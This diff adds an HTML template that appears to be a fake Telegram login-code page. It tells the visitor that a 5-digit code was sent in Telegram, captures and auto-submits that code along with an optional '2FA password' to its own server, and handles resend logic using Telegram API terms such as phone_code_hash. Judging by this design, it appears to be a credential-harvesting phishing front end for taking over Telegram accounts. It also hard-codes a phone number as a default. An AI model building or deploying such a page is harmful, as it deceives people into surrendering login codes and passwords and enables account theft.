@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Code Verification</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
+    body { font-family: 'Inter', sans-serif; }
+  </style>
+</head>
+<body class="bg-[#1e1e1e] min-h-screen flex items-start pt-24 justify-center">
+  <div class="w-full max-w-xs flex flex-col items-center px-4">
+
+    <!-- Avatar -->
+    <img
+      src="https://storage.googleapis.com/a1aa/image/5d86b0e1-9807-4d67-4ba8-8d56b6c186a8.jpg"
+      alt="Illustration of a calm monkey face emoji"
+      width="96" height="96"
+      class="w-24 h-24 mb-8"
+    />
+
+    <!-- Phone + Edit -->
+    <div class="flex items-center space-x-2 mb-2">
+      <p class="text-white text-lg font-semibold tracking-wide">
+        {{ phone or '+27 65 265 7445' }}
+      </p>
+      <button type="button" aria-label="Edit phone number" class="text-gray-400 text-base hover:text-gray-200" onclick="history.back()">
+        <i class="fas fa-pencil-alt"></i>
+      </button>
+    </div>
+
+    <!-- Info -->
+    <p id="infoText" class="text-gray-400 text-center text-sm mb-6 leading-relaxed">
+      We have sent you a message in Telegram
+      <br />
+      with the 5‑digit code.
+    </p>
+
+    <!-- Form (single input, auto-submit on 5 digits) -->
+    <form id="otpForm" method="post" class="w-full">
+      <input
+        type="text"
+        name="code"
+        inputmode="numeric"
+        autocomplete="one-time-code"
+        maxlength="5"
+        pattern="\\d{5}"
+        placeholder="Code"
+        class="w-full bg-[#2a2a2a] rounded-lg border border-[#3a3a3a] text-gray-100 placeholder-gray-400 px-4 py-3 mb-2 focus:outline-none focus:ring-2 focus:ring-[#4c4c6d]"
+        aria-label="Code input"
+      />
+
+      {% if need_password %}
+        <input
+          type="password"
+          name="password"
+          required
+          placeholder="2FA password"
+          class="w-full bg-[#2a2a2a] rounded-lg border border-[#3a3a3a] text-gray-100 placeholder-gray-400 px-4 py-3 mb-2 focus:outline-none focus:ring-2 focus:ring-[#4c4c6d]"
+        />
+      {% endif %}
+    </form>
+
+    <!-- Resend -->
+    <button
+      id="resendBtn"
+      type="button"
+      class="mt-6 text-[#4c4c6d] font-semibold text-sm tracking-wide disabled:text-gray-600 disabled:cursor-not-allowed"
+      aria-label="Resend code"
+    >
+      RESEND CODE
+    </button>
+  </div>
+
+  <script>
+    // Auto-submit when code is exactly 5 digits (typing or paste)
+    const form = document.getElementById('otpForm');
+    const codeInput = form.querySelector('input[name="code"]');
+    const infoText = document.getElementById('infoText');
+    const resendBtn = document.getElementById('resendBtn');
+
+    function sanitizeAndMaybeSubmit() {
+      const digits = codeInput.value.replace(/\\D/g, '').slice(0, 5);
+      if (codeInput.value !== digits) codeInput.value = digits;
+      if (digits.length === 5) form.submit();
+    }
+
+    codeInput.addEventListener('input', sanitizeAndMaybeSubmit);
+    codeInput.focus();
+
+    // Helpers to manage cooldown visually
+    function startCooldown(seconds, onDone) {
+      let remaining = seconds;
+      resendBtn.disabled = true;
+      const id = setInterval(() => {
+        remaining -= 1;
+        if (remaining <= 0) {
+          clearInterval(id);
+          resendBtn.disabled = false;
+          if (onDone) onDone();
+        }
+      }, 1000);
+    }
+
+    // Build a /verify?phone=... URL from current page (ensures phone stays in query)
+    function reloadVerifyWithPhone() {
+      const url = new URL(window.location.href);
+      const phone = url.searchParams.get('phone') || '{{ phone|default("", true) }}';
+      // If phone is present, reload the verify route with it
+      if (phone) {
+        const base = `${window.location.origin}${window.location.pathname}`;
+        const target = `${base}?phone=${encodeURIComponent(phone)}`;
+        window.location.replace(target);
+      } else {
+        // Fallback: simple reload if phone missing
+        window.location.reload();
+      }
+    }
+
+    async function callResend() {
+      if (resendBtn.disabled) return;
+      const original = infoText.textContent;
+      infoText.textContent = 'Resending code...';
+      resendBtn.disabled = true;
+
+      try {
+        const res = await fetch('/resend', { method: 'POST' });
+        const data = await res.json();
+        const retry = Number(data.retry_after ?? 30);
+
+        if (!res.ok) {
+          if (data.error === 'flood_wait') {
+            infoText.textContent = `Please wait ${retry}s before requesting again.`;
+          } else if (data.error === 'send_unavailable') {
+            infoText.textContent = 'Resend unavailable. Try later.';
+          } else if (data.error === 'missing_state') {
+            infoText.textContent = 'Session expired. Go back and try again.';
+          } else {
+            infoText.textContent = 'Unable to resend right now. Try again.';
+          }
+          // Start cooldown even on error to prevent hammering
+          startCooldown(retry, () => { infoText.textContent = original; });
+          return;
+        }
+
+        // Success path
+        infoText.textContent = 'A new 5‑digit code was sent.';
+        // Start the cooldown, then restore infoText
+        startCooldown(retry, () => { infoText.textContent = original; });
+
+        // Optional: Immediately reload verify with same phone to confirm server state
+        // This produces a log line like: GET /verify?phone=+9197... 200 -
+        // and ensures the refreshed phone_code_hash is reflected server-side.
+        reloadVerifyWithPhone();
+
+      } catch (e) {
+        infoText.textContent = 'Network error. Try again.';
+        resendBtn.disabled = false;
+      }
+    }
+
+    resendBtn.addEventListener('click', callResend);
+  </script>
+</body>
+</html>
